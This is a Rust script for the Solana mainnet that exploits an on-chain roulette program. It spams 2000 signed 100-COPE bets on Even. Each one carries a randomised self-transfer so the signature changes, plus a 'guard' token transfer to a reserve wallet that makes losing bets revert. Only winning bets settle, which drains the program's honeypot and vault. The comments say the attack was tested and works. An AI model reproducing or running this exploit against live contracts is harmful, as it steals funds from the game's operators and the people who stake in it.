use solana_sdk::commitment_config::CommitmentConfig;
use std::str::FromStr;
use solana_client::{
    rpc_client::RpcClient,
    rpc_config::RpcSendTransactionConfig
};
use solana_sdk::{
    signature::{read_keypair_file, Signer},
    transaction::Transaction, system_instruction, instruction::Instruction,
    pubkey::Pubkey, instruction::AccountMeta,
    sysvar
};
use rand::Rng;
use std::num::ParseIntError;

const RLT_PROGRAM_ID: &str = "rouQqKK4CKYgozmG8fuLTaAt7Crngw3dxsGnrWteuno";
const COPE_MINT: &str = "8HGyAAB1yoM1ttS7pXjHMa3dukTFGQggnFFH3hJZgzQh";

const MAINNET_SOL_PRODUCT_ORACLE: &str = "ALP8SdU9oARYVLgLR7LrqMNCYBnhtnQz1cj6bwgwQmgj";
const MAINNET_SOL_PRICE_ORACLE: &str = "H6ARHf6YXhGYeQfUzQNGk6rDNnLBQKrenN712K4AQJEG";
const MAINNET_BTC_PRODUCT_ORACLE: &str = "4aDoSXJ5o3AuvL7QFeR6h44jALQfTmUUCTVGDD6aoJTM";
const MAINNET_BTC_PRICE_ORACLE: &str = "GVXRSBjFk6e6J3NbVPXohDJetcTjaeeuykUpbQF8UoMU"; // This one is the really random one
const MAINNET_ETH_PRODUCT_ORACLE: &str = "EMkxjGC1CQ7JLiutDbfYb7UKb3zm9SJcUmr1YicBsdpZ";
const MAINNET_ETH_PRICE_ORACLE: &str = "JBu1AL4obBcCMqKBBxhpWCNUt136ijcuMZLFvTP7iWdB";

// Where we put proceeds to easily guard our transaction from not winning
const RESERVE_WALLET: &str = "8NoLq32iV5PxTz99Q5vdmPTDCk8NcPzX3mq52KhHuHry";

// Useless, replace with sound proc_macro
#[macro_export]
macro_rules! pk_from_str {
    ($a:expr) => {
        {
            Pubkey::from_str($a.into())
                .unwrap()
        }
    };
}

// From stackoverflow
pub fn decode_hex(s: &str) -> Result<Vec<u8>, ParseIntError> {
    (0..s.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&s[i..i + 2], 16))
        .collect()
}

fn main() {
    let payer = read_keypair_file("bot.json")
        .expect("Unable to read keypair file");
    
    let rpc_client = RpcClient::new("https://api.mainnet-beta.solana.com".into());

    let cope_mint = pk_from_str!(COPE_MINT);
    let ata = spl_associated_token_account::get_associated_token_address(
        &payer.pubkey(),
        &cope_mint,
    );

    let ix = Instruction {
        program_id: pk_from_str!(RLT_PROGRAM_ID),
        accounts: vec![
            AccountMeta::new(pk_from_str!("FiapuesVT8nffoWy3o7sAHyRnWZYJwJKijmbeBjmRK3S"), false), // rngAccountKey
            AccountMeta::new_readonly(payer.pubkey(), true),
            AccountMeta::new(ata, false),
            AccountMeta::new_readonly(cope_mint, false),
            AccountMeta::new_readonly(pk_from_str!("432AHW7ufzsAjbU4pVLA8ZLUWf8hrSYt8J3tZbcLs1xf"), false), // honeypotAccount
            AccountMeta::new(pk_from_str!("69z9KodTKvsYxWDfKbkUV9QA1p8qKeU8rYB5EbfX3MJv"), false), // vaultAccount
            AccountMeta::new_readonly(spl_token::ID, false),
            AccountMeta::new_readonly(sysvar::clock::ID, false), // All the pyth stuff from here
            AccountMeta::new_readonly(pk_from_str!(MAINNET_SOL_PRODUCT_ORACLE), false),
            AccountMeta::new_readonly(pk_from_str!(MAINNET_SOL_PRICE_ORACLE), false),
            AccountMeta::new_readonly(pk_from_str!(MAINNET_BTC_PRODUCT_ORACLE), false),
            AccountMeta::new_readonly(pk_from_str!(MAINNET_BTC_PRICE_ORACLE), false),
            AccountMeta::new_readonly(pk_from_str!(MAINNET_ETH_PRODUCT_ORACLE), false),
            AccountMeta::new_readonly(pk_from_str!(MAINNET_ETH_PRICE_ORACLE), false),
        ],
        data: decode_hex("040a0000000000000001000000286400000000000000").unwrap() // Betting 100 COPE on Even, copied from sollet out of laziness
    };

    let reserve_ata = spl_associated_token_account::get_associated_token_address(
        &pk_from_str!(RESERVE_WALLET),
        &cope_mint
    );

    // Started by simulating because I am cautious
    //let result = rpc_client.simulate_transaction(&transaction).unwrap();
    //println!("result: {:?}", result);

    // Then send one for real, observe
    // rpc_client.send_and_confirm_transaction_with_spinner_and_config(
    //     &transaction,
    //     CommitmentConfig::processed(),
    //     RpcSendTransactionConfig {
    //         skip_preflight: true,
    //         ..RpcSendTransactionConfig::default()
    //     },
    // )
    //     .unwrap();

    // Send the whole lot, it works
    let mut rng = rand::thread_rng();
    let (hash, _, _) = rpc_client.get_recent_blockhash_with_commitment(
        CommitmentConfig::finalized()
    ).unwrap().value;
    
    for _ in 0..2000 {
        let mut transaction = Transaction::new_with_payer(
            &[
                ix.clone(),
                // This is the signature changer, so we can spam a bit without bothering about the blockhash
                system_instruction::transfer(
                    &payer.pubkey(),
                    &payer.pubkey(),
                    rng.gen_range(0..10_000_000) // 0 to 0.01 SOL
                ),
                // This is the guard, if our balance has dropped, then we make things fail, otherwise this ensure balance remains the minimum
                spl_token::instruction::transfer(
                    &spl_token::ID,
                    &ata,
                    &reserve_ata,
                    &payer.pubkey(),
                    &[],
                    100_000_000 // 6 decimals
                ).unwrap(),
            ],
            Some(&payer.pubkey()),
        );
        transaction.sign(&[&payer], hash);

        rpc_client.send_transaction_with_config(
            &transaction,
            RpcSendTransactionConfig {
                skip_preflight: true,
                ..RpcSendTransactionConfig::default()
            },
        ).unwrap();
    }
}
